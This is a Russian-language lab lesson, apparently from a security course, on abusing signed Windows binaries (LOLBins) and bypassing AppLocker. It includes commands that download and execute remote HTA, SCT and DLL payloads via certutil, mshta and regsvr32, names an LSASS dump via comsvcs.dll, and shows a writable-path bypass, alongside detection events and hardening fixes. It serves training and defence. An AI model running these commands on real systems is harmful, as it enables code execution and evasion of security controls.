# 12.4 — LOLBins и AppLocker

> **M12 · Этап 2 · 5 ч · 🟡 · артефакт:** `labs/m12-evasion/l04-lolbins/`

## Цель

Использовать легитимные бинарники Windows (LOLBins/LOLBAS) для доставки, выполнения и обхода политик, а также понимать, как AppLocker/WDAC это ограничивают.

## Результат

- 8 LOLBins с назначением и примером.
- Обход AppLocker в контролируемой лабе (если применимо).
- Таблица «бинарник → техника → детект».

## Теория

### 1. Что такое LOLBins

Living Off the Land Binaries — подписанные системные утилиты, которые можно использовать не по назначению: скачивание, выполнение, компиляция, обход политик.

### 2. Каталог

| Бинарник | Возможность |
|---|---|
| `certutil.exe` | скачивание, base64 decode |
| `bitsadmin.exe` | скачивание |
| `mshta.exe` | выполнение HTA/JS/VBS |
| `rundll32.exe` | вызов DLL-экспорта |
| `regsvr32.exe` | загрузка COM-скрипта (squiblydoo) |
| `wmic.exe` | WMI-выполнение, загрузка XSL |
| `installutil.exe` | запуск .NET-кода |
| `msbuild.exe` | компиляция/выполнение |
| `cscript/wscript` | скрипты |
| `forfiles.exe` | запуск команды |
| `pcalua.exe` | запуск с обходом |
| `rundll32` + `comsvcs.dll` | дамп LSASS |

### 3. AppLocker

Правила по путям, издателю, хэшу. Типичные ошибки:

- разрешён `C:\Windows\Temp` или `C:\ProgramData`;
- разрешены все подписанные Microsoft-бинарники (а их можно злоупотребить);
- writable-каталог в разрешённом пути.

Проверка:

```powershell
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\lab\test.exe -User Everyone
```

### 4. WDAC

Более строгая политика на уровне ядра. Обход сложнее; часто эксплуатируют доверенные подписанные утилиты или уязвимые драйверы. Это отдельный, продвинутый уровень и требует дополнительного изучения.

### 5. Детект

- 4688 с командной строкой LOLBin.
- Sysmon 1 (процесс) + 3 (сеть) + 11 (файл).
- `certutil -urlcache`, `mshta http`, `regsvr32 /i:http`.
- AppLocker: 8003/8004 (audit/enforce).
- Корреляция: подписанный бинарник + нетипичный родитель + сеть.

## Лаборатория

> `WIN01` с AppLocker (audit mode сначала), `LNX01` с HTTP-сервером.

### 1. Скачивание

```powershell
certutil.exe -urlcache -split -f http://10.10.10.50/test.txt C:\lab\test.txt
bitsadmin.exe /transfer job http://10.10.10.50/test.txt C:\lab\test2.txt
```

Ожидаемо: файлы скачаны. Зафиксируйте 4688 и Sysmon 3.

### 2. Выполнение

```powershell
# HTA
mshta.exe http://10.10.10.50/test.hta
# DLL
rundll32.exe C:\lab\test.dll,EntryPoint
# COM script
regsvr32.exe /s /u /i:http://10.10.10.50/test.sct scrobj.dll
```

Ожидаемо: выполнение в контексте пользователя. Часть техник может быть заблокирована — это результат.

### 3. AppLocker

```powershell
Get-AppLockerPolicy -Effective -Xml
Test-AppLockerPolicy -Path C:\lab\loader.exe -User Everyone
```

Ожидаемо: allow/deny. Найдите путь, который разрешён и writable.

### 4. Обход политики (в лабе)

Если разрешён `C:\Windows\Temp`:

```powershell
copy C:\lab\loader.exe C:\Windows\Temp\svc.exe
C:\Windows\Temp\svc.exe
```

Ожидаемо: запуск, несмотря на политику для `C:\lab`. Зафиксируйте, что именно разрешило.

### 5. События

```powershell
Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -MaxEvents 20
Get-WinEvent -LogName Security -MaxEvents 200 | ? Id -eq 4688 |
  Select-Object TimeCreated,Message
```

### 6. Таблица

| LOLBin | Техника | Аргументы | Событие | Фикс |
|---|---|---|---|---|

## Атака и защита

- **Атака:** подписанный бинарник + сеть/файл.
- **Детект:** 4688, Sysmon 1/3/11, AppLocker 8003/8004, корреляция.
- **Фикс:** WDAC вместо «мягкого» AppLocker, запрет writable-путей в allow-правилах, блокировка LOLBin-паттернов, ограничение макросов/HTA, мониторинг.

## Самопроверка

- [ ] Почему LOLBins обходят AppLocker по путям?
- [ ] Чем WDAC строже AppLocker?
- [ ] Какой лог покажет `certutil -urlcache`?
- [ ] Почему «все подписанные Microsoft» — плохое правило?
- [ ] Как отличить легитимный `rundll32` от подозрительного?

## Дальше

[12.5 — Тест против Defender](l05-defender-test.md)
